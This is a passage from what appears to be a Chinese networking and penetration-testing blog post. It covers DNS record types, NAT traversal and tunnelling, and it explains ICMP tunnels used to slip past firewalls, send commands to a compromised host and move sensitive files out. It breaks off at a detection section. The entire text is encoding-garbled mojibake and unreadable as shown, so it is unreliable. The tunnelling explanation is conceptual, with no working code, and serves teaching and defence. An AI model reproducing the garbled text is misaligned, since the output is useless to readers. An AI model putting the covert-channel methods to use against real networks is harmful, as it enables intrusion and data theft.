è¿™ä¸ªåŸŸåçš„é‚®ä»¶è¯¥é€åˆ°å“ªä¸ªé‚®å±€ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰ã€‚<em>ä¾‹å­</em>ï¼š<code>xxx@taobao.com</code>çš„é‚®ä»¶ä¼šè¢«é€åˆ°<code>115.238.25.xxx</code>çš„æœåŠ¡å™¨ï¼Œè€Œç½‘é¡µè®¿é—®è¿˜æ˜¯èµ°Aè®°å½•çš„åœ°å€</p><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>å¯ä»¥è®¾å¤šä¸ªé‚®å±€ï¼Œä¼˜å…ˆçº§æ•°å­—å°çš„å…ˆé€ï¼ˆæ¯”å¦‚ä¼˜å…ˆçº§5çš„æœåŠ¡å™¨ä¼˜å…ˆäº10çš„ï¼‰</li><li>é‚®ä»¶æœåŠ¡å™¨åäº†ï¼Œå¤‡ç”¨çš„ä¼šè‡ªåŠ¨é¡¶ä¸Š</li></ul><h3 id="CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰"><a href="#CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰" class="headerlink" title="CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰"></a><strong>CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰</strong></h3><p>Canonical Nameï¼Œå³åˆ«åè§£æã€‚æ‰€è°“åˆ«åè§£æå°±æ˜¯å¯ä»¥ä¸ºä¸€ä¸ªåŸŸåè®¾ç½®ä¸€ä¸ªæˆ–è€…å¤šä¸ªåˆ«åï¼Œå¦‚å°†aaa.comè§£æåˆ°bbb.netã€å°†ccc.comä¹Ÿè§£æåˆ°bbb.netï¼Œå…¶ä¸­bbb.netåˆ†åˆ«æ˜¯aaa.comå’Œccc.comçš„åˆ«å</p><p><strong>åŠŸèƒ½</strong>ï¼šç»™åŸŸåèµ·å¤–å·ï¼Œå¤šä¸ªåå­—æŒ‡å‘åŒä¸€ä¸ªåœ°æ–¹</p><p><em>ä¾‹å­</em>ï¼š<code>aaa.com</code>å’Œ<code>ccc.com</code>éƒ½æŒ‡å‘<code>bbb.net</code>ï¼Œå°±åƒâ€œè‚¯å¾·åŸºâ€å’Œâ€œKFCâ€æ˜¯åŒä¸€å®¶åº—</p><p><strong>ç‰¹ç‚¹</strong></p><p>æ¢æœåŠ¡å™¨åœ°å€æ—¶ï¼Œåªç”¨æ”¹ä¸»åŸŸåï¼ˆæ¯”å¦‚<code>bbb.net</code>çš„IPï¼‰ï¼Œæ‰€æœ‰åˆ«åè‡ªåŠ¨æ›´æ–°ï¼Œä¸ç”¨ä¸€ä¸ªä¸ªæ”¹</p><p>å¿…é¡»å¸¦å‰ç¼€ï¼ˆæ¯”å¦‚<code>www.taobao.com</code>ä¸èƒ½ç›´æ¥å«<code>taobao.com</code>ï¼Œå¾—ç”¨Aè®°å½•</p><h3 id="NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰"><a href="#NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰" class="headerlink" title="NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰"></a><strong>NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰</strong></h3><p>ä¸ºæŸä¸ªåŸŸåæŒ‡å®šDNSè§£ææœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªåŸŸåç”±æŒ‡å®šçš„IPåœ°å€çš„DNSæœåŠ¡å™¨å–è§£æ</p><p><strong>åŠŸèƒ½</strong>ï¼šæŒ‡å®šè°è´Ÿè´£ä½ å®¶åŸŸåçš„â€œå¿«é€’åˆ†æ‹£â€ï¼ˆDNSè§£æï¼‰ã€‚<br><em>ä¾‹å­</em>ï¼šå¦‚æœä½ ç”¨è…¾è®¯äº‘çš„DNSæœåŠ¡ï¼ŒNSè®°å½•ä¼šå†™æˆ<code>ns1.dnspod.com</code>ï¼Œç›¸å½“äºæŠŠå¿«é€’åˆ†æ‹£å·¥ä½œå¤–åŒ…ç»™è…¾è®¯</p><p><strong>ç‰¹ç‚¹</strong></p><p>ä¸€ä¸ªåŸŸåå¯ä»¥æœ‰å¤šä¸ªåˆ†æ‹£ä¸­å¿ƒï¼ˆæ¯”å¦‚ä¸»å¤‡DNSæœåŠ¡å™¨ï¼‰</p><p>æ”¹NSè®°å½•åï¼Œå…¨çƒç”Ÿæ•ˆéœ€è¦24-48å°æ—¶ï¼ˆå› ä¸ºå„åœ°å¿«é€’å…¬å¸æ›´æ–°åœ°å€ç°¿è¦æ—¶é—´ï¼‰</p><h3 id="TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰"><a href="#TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰" class="headerlink" title="TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰"></a><strong>TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰</strong></h3><p>ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®è¯´æ˜ï¼Œå¦‚å¯ä»¥ä¸ºddd.netè®¾ç½®TXTè®°å½•ä¸ºâ€è¿™æ˜¯XXXçš„åšå®¢â€è¿™æ ·çš„è¯´æ˜</p><p><strong>åŠŸèƒ½</strong>ï¼šç»™åŸŸåè´´ä¸ªâ€œå¤‡æ³¨æ ‡ç­¾â€ï¼Œç”¨æ¥éªŒè¯èº«ä»½æˆ–é˜²åƒåœ¾é‚®ä»¶</p><p><em>ä¾‹å­</em>ï¼š</p><p>éªŒè¯åŸŸåæ‰€æœ‰æƒï¼šåŠ ä¸€æ¡TXTè®°å½•<code>google-site-verification=xxxxx</code>ï¼Œè¯æ˜ä½ æ˜¯ç½‘ç«™ä¸»äºº</p><p>é˜²åƒåœ¾é‚®ä»¶ï¼šè®¾ç½®SPFè®°å½•<code>v=spf1 include:aliyun.com ~all</code>ï¼Œå‘Šè¯‰åˆ«äººâ€œåªæœ‰é˜¿é‡Œäº‘çš„æœåŠ¡å™¨èƒ½ä»£è¡¨æˆ‘å‘é‚®ä»¶</p><p><strong>ç‰¹ç‚¹</strong></p><p>å†…å®¹éšä¾¿å†™ï¼Œä½†æ ¼å¼è¦å¯¹ï¼ˆæ¯”å¦‚SPFè®°å½•å¿…é¡»ä»¥<code>v=spf1</code>å¼€å¤´ï¼‰</p><p>ç®€å•å­¦ä¹ äº†è¿™ä¸ªåè®®çš„åŸºç¡€çŸ¥è¯†ä¹‹åå°±å‡†å¤‡å­¦ä¹ å†…ç½‘ç©¿é€çš„çŸ¥è¯†</p><h1 id="å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ "><a href="#å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ " class="headerlink" title="å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ "></a>å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ </h1><h2 id="å†…ç½‘ç©¿é€æ¦‚è¿°"><a href="#å†…ç½‘ç©¿é€æ¦‚è¿°" class="headerlink" title="å†…ç½‘ç©¿é€æ¦‚è¿°"></a>å†…ç½‘ç©¿é€æ¦‚è¿°</h2><h5 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h5><p>åˆ©ç”¨å„ç§éš§é“æŠ€æœ¯ï¼Œä»¥ç½‘ç»œé˜²ç«å¢™å…è®¸çš„åè®®ï¼Œç»•è¿‡ç½‘ç»œé˜²ç«å¢™çš„å°é”ï¼Œå®ç°è®¿é—®è¢«å°é”çš„ç›®æ ‡ç½‘ç»œ</p><p><em>å†…ç½‘ç©¿é€ï¼Œä¹Ÿå³ NAT ç©¿é€ï¼Œè¿›è¡Œ NAT ç©¿é€æ˜¯ä¸ºäº†ä½¿å…·æœ‰æŸä¸€ä¸ªç‰¹å®šæº IP åœ°å€å’Œæºç«¯å£å·çš„æ•°æ®åŒ…ä¸è¢« NAT è®¾å¤‡å±è”½è€Œæ­£ç¡®è·¯ç”±åˆ°å†…ç½‘ä¸»æœºã€‚</em></p><p>ç®€å•æ¥è¯´å†…ç½‘ç©¿é€çš„ç›®çš„æ˜¯ï¼šè®©å¤–ç½‘èƒ½è®¿é—®ä½ æœ¬åœ°çš„åº”ç”¨ï¼Œä¾‹å¦‚åœ¨å¤–ç½‘æ‰“å¼€ä½ æœ¬åœ°<a href="http://127.0.0.1æŒ‡å‘çš„webç«™ç‚¹.ä¸¾ä¾‹å­æˆ‘çš„ä¸–ç•Œä½ æƒ³è¦è¿›è¡Œå±€åŸŸç½‘è”æœºåŒæ—¶è¦å’Œä½ è¿œåœ¨å¤©è¾¹çš„æœ‹å‹è¿›è¡Œæ¸¸ç©é‚£ä¹ˆç›†å‹å°±å¯ä»¥åˆ©ç”¨å†…ç½‘ç©¿é€æ¥è¾¾æˆä¸ä½ ç©çš„ç›®çš„/">http://127.0.0.1æŒ‡å‘çš„Webç«™ç‚¹ã€‚ä¸¾ä¾‹å­æˆ‘çš„ä¸–ç•Œä½ æƒ³è¦è¿›è¡Œå±€åŸŸç½‘è”æœºåŒæ—¶è¦å’Œä½ è¿œåœ¨å¤©è¾¹çš„æœ‹å‹è¿›è¡Œæ¸¸ç©é‚£ä¹ˆç›†å‹å°±å¯ä»¥åˆ©ç”¨å†…ç½‘ç©¿é€æ¥è¾¾æˆä¸ä½ ç©çš„ç›®çš„</a></p><p>è¿™é‡Œç®€å•äº†è§£ä¸‹NATåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**NAT åè®®ï¼ˆNetwork Address Translationï¼‰** çš„åº”ç”¨åœºæ™¯å¦‚åŒå®ƒçš„åç§°â€”â€”ç½‘ç»œåœ°å€è½¬æ¢ï¼Œåº”ç”¨äºå†…éƒ¨ç½‘åˆ°å¤–éƒ¨ç½‘çš„åœ°å€è½¬æ¢è¿‡ç¨‹ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">**æ ¸å¿ƒåŠŸèƒ½**ï¼šæŠŠå†…ç½‘è®¾å¤‡çš„â€œç§æœ‰é—¨ç‰Œå·â€ï¼ˆç§æœ‰IPï¼‰è½¬æ¢æˆå¤–ç½‘çš„â€œå…¬å…±é—¨ç‰Œå·â€ï¼ˆå…¬ç½‘IPï¼‰ï¼Œæ–¹ä¾¿å†…å¤–ç½‘é€šä¿¡</span><br><span class="line"></span><br><span class="line">*ä¾‹å­*ï¼šä½ å®¶åœ¨å°åŒº3å·æ¥¼ï¼ˆå†…ç½‘IP `192.168.1.5`ï¼‰ï¼Œä½†å¿«é€’å•ä¸Šåªèƒ½å†™å°åŒºå¤§é—¨åœ°å€ï¼ˆå…¬ç½‘IP `219.155.6.240`ï¼‰ï¼Œé—¨å«ï¼ˆNATè®¾å¤‡ï¼‰è´Ÿè´£æŠŠå¿«é€’é€åˆ°ä½ å®¶</span><br><span class="line"></span><br><span class="line">**ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ****</span><br><span class="line"></span><br><span class="line">**æ ¹æœ¬åŸå› **ï¼šå…¨çƒå…¬ç½‘IPä¸å¤Ÿç”¨ï¼ˆç±»ä¼¼é—¨ç‰Œå·ä¸å¤Ÿï¼‰ï¼Œè€Œå°åŒºï¼ˆå†…ç½‘ï¼‰å¯ä»¥æ— é™å¤åˆ¶ç§æœ‰é—¨ç‰Œå·</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæƒ³è¦å®ç°å†…ç½‘ç©¿é€å°±å¾—è¿›è¡Œä¸€ä¸ªæ­å»ºæ¡¥æ¢</p><h3 id="å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰"><a href="#å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰" class="headerlink" title="å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰****"></a><strong>å¸¸è§å®ç°æ–¹å¼</strong>ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰****</h3><p>ç«¯å£æ˜ å°„ åå‘ä»£ç†ï¼Œvpnéš§é“ï¼ŒNATè¿›è¡Œç©¿é€</p><p>ç«¯å£æ˜ å°„å°±æ˜¯æŠŠå†…ç½‘çš„ipéƒ½æ˜ å°„åˆ°ä¸€ä¸ªå…¬ç½‘çš„ç«¯å£ä¸Šé¢æ‰€æœ‰çš„æµé‡å°±ä¼šä»å…¬ç½‘ipç«¯å£è¿›å…¥åˆ°ä½ çš„å†…ç½‘ip</p><p>åå‘ä»£ç† å°±æ¯”å¦‚è¯´æˆ‘ä»¬ç§Ÿä¸€ä¸ªäº‘æœåŠ¡å™¨ï¼Œåˆ«äººå¯¹äº‘æœåŠ¡çš„å…¬ç½‘ipè¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨ä¼šæŠŠåˆ«äººè®¿é—®çš„æµé‡è½¬æ¥åˆ°æˆ‘ä»¬å†…ç½‘çš„è®¾å¤‡</p><p><strong>ä¾‹å­</strong>ï¼šç”¨frpå·¥å…·æŠŠå†…ç½‘æ‘„åƒå¤´ç”»é¢é€šè¿‡äº‘æœåŠ¡å™¨æš´éœ²ç»™å¤–ç½‘</p><p>vpnå°±æ˜¯å¼€ä¸€æ¡æ–°çš„éš§é“ ç›´æ¥åˆ°å…¬ç½‘ä¸ä¼šç»è¿‡è¿è¥å•†</p><p>å†…ç½‘ç©¿é€ï¼ˆNATç©¿é€ï¼‰è’‹NATè®¾å¤‡è®°å½•ç”¨æ¥æŠŠå†…éƒ¨ç½‘ç»œçš„ç§æœ‰IPåœ°å€æ˜ å°„åˆ°å¤–éƒ¨ç½‘ç»œçš„åˆæ³•IPåœ°å€ä¸Šå»</p><p>ææ¸…æ¥šå†…ç½‘ç©¿é€çš„åŸºæœ¬åŸç†</p><p>ç»ˆäºåˆ°éš§é“æŠ€æœ¯äº†</p><h1 id="éš§é“æŠ€æœ¯"><a href="#éš§é“æŠ€æœ¯" class="headerlink" title="éš§é“æŠ€æœ¯"></a><strong>éš§é“æŠ€æœ¯</strong></h1><p>ä¸€ç§é€šè¿‡ä½¿ç”¨äº’è”ç½‘ç»œçš„åŸºç¡€è®¾æ–½åœ¨ç½‘ç»œä¹‹é—´ä¼ é€’æ•°æ®çš„æ–¹å¼ï¼ŒåŒ…æ‹¬æ•°æ®å°è£…ã€ä¼ è¾“å’Œè§£åŒ…åœ¨å†…çš„å…¨è¿‡ç¨‹ã€‚ä½¿ç”¨éš§é“ä¼ é€’çš„æ•°æ®(æˆ–è´Ÿè½½)å¯ä»¥æ˜¯ä¸åŒåè®®çš„æ•°æ®å¸§æˆ–åŒ…ã€‚</p><p>ç”¨å¤§ç™½è¯è§£é‡Š<strong>éš§é“æŠ€æœ¯</strong>ï¼Œå¯ä»¥æƒ³è±¡æˆ<strong>ç»™æ•°æ®åŒ…ç©¿é©¬ç”²è¿‡å®‰æ£€</strong>çš„è¿‡ç¨‹</p><p>æ•´ä¸ªè¿‡ç¨‹å°±åƒå¿«é€’å‘˜è¦æŠŠè¿ç¦å“é€è¿‡å®‰æ£€ï¼Œå¿…é¡»å¥—ä¸ªåˆæ³•çš„åŒ…è£…ï¼Œè¿‡äº†æ£€æŸ¥å†æ‹†å¼€è¿˜åŸã€‚å…·ä½“åˆ†ä¸‰æ­¥èµ°</p><h3 id="ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰"><a href="#ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰"></a><strong>ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰</strong></h3><p><strong>ä¼ªè£…éœ€æ±‚</strong>ï¼šæ¯”å¦‚ä½ æƒ³ä»å…¬å¸å†…ç½‘ä¼ æ–‡ä»¶åˆ°å®¶é‡Œï¼Œä½†å…¬å¸é˜²ç«å¢™åªå…è®¸HTTPæµé‡é€šè¿‡ï¼ˆå…¶ä»–åè®®å…¨è¢«æ‹¦æˆªï¼‰</p><p><strong>å¥—å¤–å£³</strong>ï¼šéš§é“æŠ€æœ¯ä¼šæŠŠä½ çš„æ–‡ä»¶æ•°æ®ï¼ˆæ¯”å¦‚SSHåè®®ï¼‰å¡è¿›HTTPåè®®çš„â€œå¿«é€’ç®±â€é‡Œï¼Œå¹¶è´´ä¸Šæ–°æ ‡ç­¾ï¼ˆå¦‚ç›®æ ‡åœ°å€ã€ç«¯å£ï¼‰</p><p><em>å°±åƒæŠŠç§å¯†ä¿¡ä»¶å¡è¿›æœˆé¥¼ç›’ï¼Œå¤–é¢å†™ä¸Šâ€œèŠ‚æ—¥ç¤¼å“â€è’™æ··è¿‡å…³ã€‚</em></p><h3 id="ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰"><a href="#ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰"></a><strong>ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰</strong></h3><p><strong>èµ°å…¬å…±é€šé“</strong>ï¼šä¼ªè£…åçš„æ•°æ®åŒ…é€šè¿‡å…¬å…±ç½‘ç»œï¼ˆæ¯”å¦‚äº’è”ç½‘ï¼‰ä¼ è¾“ï¼Œé˜²ç«å¢™çœ‹åˆ°çš„æ˜¯åˆæ³•çš„HTTPæµé‡ï¼Œç›´æ¥æ”¾è¡Œ<em>æ¯”å¦‚ç”¨å¾®ä¿¡å‘æ–‡ä»¶ï¼Œå®é™…èµ°çš„æ˜¯å¾®ä¿¡çš„æœåŠ¡å™¨é€šé“ï¼Œè€Œä¸æ˜¯ç›´è¿å¯¹æ–¹ç”µè„‘ã€‚</em></p><p><strong>è·¯ç”±ä¸­è½¬</strong>ï¼šæ•°æ®åŒ…å¯èƒ½ç»è¿‡å¤šä¸ªè·¯ç”±å™¨è·³è½¬ï¼Œä½†å…¨ç¨‹ä¿æŒâ€œé©¬ç”²â€ä¸è„±è½<em>ç±»ä¼¼å¿«é€’ä»åŒ—äº¬å‘å¹¿å·ï¼Œä¸­é—´ç»è¿‡éƒ‘å·ã€é•¿æ²™ä¸­è½¬ç«™ï¼Œä½†æœˆé¥¼ç›’å§‹ç»ˆå®Œå¥½</em></p><h3 id="ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰"></a><strong>ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰</strong></h3><p><strong>ç›®çš„åœ°éªŒæ”¶</strong>ï¼šæ•°æ®åŒ…åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨åï¼Œéš§é“ç«¯ç‚¹ï¼ˆå¦‚å®¶é‡Œçš„VPNæœåŠ¡å™¨ï¼‰ä¼šæ‹†æ‰HTTPçš„â€œé©¬ç”²â€ï¼Œè¿˜åŸå‡ºåŸå§‹æ•°æ®ï¼ˆSSHåè®®æ–‡ä»¶ï¼‰</p><p><em>å°±åƒæ”¶åˆ°æœˆé¥¼ç›’åæ‹†å¼€ï¼Œå–å‡ºé‡Œé¢çš„ç§å¯†ä¿¡ä»¶</em><strong>ç²¾å‡†æŠ•é€’</strong>ï¼šè§£åŒ…åçš„æ•°æ®æŒ‰åŸå§‹åè®®é€åˆ°æœ€ç»ˆè®¾å¤‡ï¼ˆå¦‚ä½ çš„å®¶ç”¨ç”µè„‘ï¼‰</p><p>æŒ‰æ‰€å¤„çš„åè®®å±‚åˆ†å±‚ï¼š</p><ul><li>ç½‘ç»œå±‚éš§é“ï¼šICMPéš§é“ç­‰</li><li>ä¼ è¾“å±‚éš§é“ï¼šTCPéš§é“ã€UDPéš§é“</li><li>åº”ç”¨å±‚éš§é“ï¼šHTTPã€DNSã€SSHç­‰éš§é“</li></ul><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250321142723.png"></p><p>é‚£ä¹ˆå†…ç½‘é‡Œé¢é™¤äº†åˆšæ‰äº†è§£åˆ°çš„httpåè®®å¯ä»¥é€šè¿‡é˜²ç«å¢™è¿›è¡Œå‡ºç½‘è¿˜æœ‰å“ªäº›åè®®å‘¢</p><h3 id="å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼"><a href="#å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼" class="headerlink" title="å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼"></a>å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼</h3><h5 id="å…è®¸ICMPåè®®å‡ºç½‘"><a href="#å…è®¸ICMPåè®®å‡ºç½‘" class="headerlink" title="å…è®¸ICMPåè®®å‡ºç½‘"></a>å…è®¸ICMPåè®®å‡ºç½‘</h5><h2 id="ICMPéš§é“åŸç†"><a href="#ICMPéš§é“åŸç†" class="headerlink" title="ICMPéš§é“åŸç†"></a>ICMPéš§é“åŸç†</h2><p>é¦–å…ˆäº†è§£ä¸‹ICMPè¿™ä¸ªåè®®</p><p>ICMPï¼ˆInternet Control Message Protocolï¼‰Internetæ§åˆ¶æŠ¥æ–‡åè®®ã€‚å®ƒæ˜¯TCP&#x2F;IPåè®®ç°‡çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚è¿™äº›æ§åˆ¶æ¶ˆæ¯è™½ç„¶å¹¶ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ•°æ®çš„ä¼ é€’èµ·ç€é‡è¦çš„ä½œç”¨ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªæ£€æŸ¥ç½‘ç»œå¯ä¸å¯è¾¾çš„åè®®</p><p>åŸç†</p><p>ç”±äºICMPæŠ¥æ–‡è‡ªèº«å¯ä»¥æºå¸¦æ•°æ®ï¼Œè€Œä¸”ICMPæŠ¥æ–‡æ˜¯ç”±ç³»ç»Ÿå†…æ ¸å¤„ç†çš„ï¼Œä¸å ç”¨ä»»ä½•ç«¯å£ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ã€‚</p><p>é€šå¸¸ICMPéš§é“æŠ€æœ¯é‡‡ç”¨ICMPçš„ICMP_ECHOå’ŒICMP_ECHOREPLYä¸¤ç§æŠ¥æ–‡ï¼ŒæŠŠæ•°æ®éšè—åœ¨ICMPæ•°æ®åŒ…åŒ…å¤´çš„é€‰é¡¹åŸŸä¸­ï¼Œåˆ©ç”¨pingå‘½ä»¤å»ºç«‹éšè”½é€šé“ã€‚</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/6a123b327b673db81ffb5ffb471e2cc.png"></p><p>è¿›è¡Œéšè”½ä¼ è¾“çš„æ—¶å€™ï¼Œè‚‰é¸¡(é˜²ç«å¢™å†…éƒ¨)è¿è¡Œå¹¶æ¥å—å¤–éƒ¨æ”»å‡»ç«¯çš„ICMP_ECHOæ•°æ®åŒ…ï¼Œæ”»å‡»ç«¯æŠŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤éšè—åœ¨ICMP_ECHOæ•°æ®åŒ…ä¸­ï¼Œè‚‰é¸¡æ¥æ”¶åˆ°è¯¥æ•°æ®åŒ…ï¼Œè§£å‡ºå…¶ä¸­éšè—çš„å‘½ä»¤ï¼Œå¹¶åœ¨é˜²ç«å¢™å†…éƒ¨ä¸»æœºä¸Šæ‰§è¡Œï¼Œå†æŠŠæ‰§è¡Œç»“æœéšè—åœ¨ICMP_ECHOREPLYæ•°æ®åŒ…ä¸­ï¼Œå‘é€ç»™å¤–éƒ¨æ”»å‡»ç«¯ã€‚</p><p>æ¯”å¦‚ï¼šæ”»å‡»è€…æŠŠæŒ‡ä»¤<code>whoami</code>è—åœ¨æ•°æ®åŒºï¼Œå‘åˆ°å†…ç½‘æœºå™¨ï¼Œå†…ç½‘æœºå™¨æ‰§è¡Œ<code>whoami</code>åï¼ŒæŠŠç»“æœè—åœ¨å›åº”çš„ICMPåŒ…é‡Œå‘å›å»</p><h3 id="ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ"><a href="#ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ" class="headerlink" title="ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ"></a><strong>ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡é˜²ç«å¢™</strong>ï¼š</p><p>å†…ç½‘æœºå™¨è¢«é™åˆ¶åªèƒ½<code>ping</code>å¤–ç½‘ï¼Œä½†é€šè¿‡ICMPéš§é“å¯ä»¥å·å·ä¼ æ–‡ä»¶æˆ–è¿œç¨‹æ§åˆ¶</p><ul><li><em>ä¾‹å­ï¼šå…¬å¸å†…ç½‘ç¦æ­¢SSHï¼Œä½†å…è®¸<code>ping</code>ï¼Œå‘˜å·¥ç”¨ICMPéš§é“ä¼ æ•æ„Ÿæ–‡ä»¶ã€‚</em></li></ul><p><strong>åå¼¹Shell</strong></p><p>æ”»å‡»è€…é€šè¿‡ICMPåŒ…å‘å—å®³æœºå™¨å‘é€æŒ‡ä»¤ï¼Œå—å®³æœºå™¨æ‰§è¡Œåé€šè¿‡ICMPåŒ…è¿”å›ç»“æœï¼Œå®ç°è¿œç¨‹æ§åˆ¶</p><p><strong>å†…ç½‘ç©¿é€</strong></p><p>å†…ç½‘ä¸»æœºé€šè¿‡ICMPéš§é“å°†æµé‡è½¬å‘åˆ°å…¬ç½‘ä»£ç†ï¼Œå®ç°è®¿é—®å¤–ç½‘èµ„æºï¼ˆç±»ä¼¼æ—©å¹´å…è´¹ä¸Šç½‘çš„â€œé»‘ç§‘æŠ€â€ï¼‰</p><h3 id="ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹"><a href="#ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹"></a><strong>ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹</strong></h3><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a><strong>ä¼˜ç‚¹</strong></h4><p><strong>éšè”½æ€§å¼º</strong>ï¼šæ•°æ®è—åœ¨<code>ping</code>åŒ…é‡Œï¼Œé˜²ç«å¢™ä¸€èˆ¬ä¸ç®¡</p><p><strong>æ— éœ€ç«¯å£</strong>ï¼šç›´æ¥åˆ©ç”¨ç³»ç»Ÿå†…æ ¸å¤„ç†ICMPåè®®ï¼Œä¸ä¾èµ–ç‰¹å®šç«¯å£</p><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a><strong>ç¼ºç‚¹</strong></h4><p><strong>é€Ÿåº¦æ…¢</strong>ï¼šICMPåŒ…é»˜è®¤æ•°æ®é‡å°ï¼ˆWindows 32å­—èŠ‚ã€Linux 48å­—èŠ‚ï¼‰ï¼Œå¤§æ–‡ä»¶ä¼ è¾“åƒèš‚èšæ¬å®¶</p><p><strong>ä¸ç¨³å®š</strong>ï¼šICMPæ˜¯æ— è¿æ¥åè®®ï¼Œå®¹æ˜“ä¸¢åŒ…ï¼Œé€‚åˆä¼ å°æŒ‡ä»¤ï¼Œä¸é€‚åˆé«˜æ¸…è§†é¢‘</p><p><strong>æƒé™è¦æ±‚é«˜</strong>ï¼šä¿®æ”¹ICMPæ•°æ®éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆæ™®é€šç”¨æˆ·ç©ä¸è½¬ï¼‰</p><h3 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h3><ul><li><p>æ£€æµ‹åŒä¸€æ¥æº ICMP æ•°æ®åŒ…çš„æ•°é‡ã€‚ä¸€ä¸ªæ­£å¸¸çš„ ping 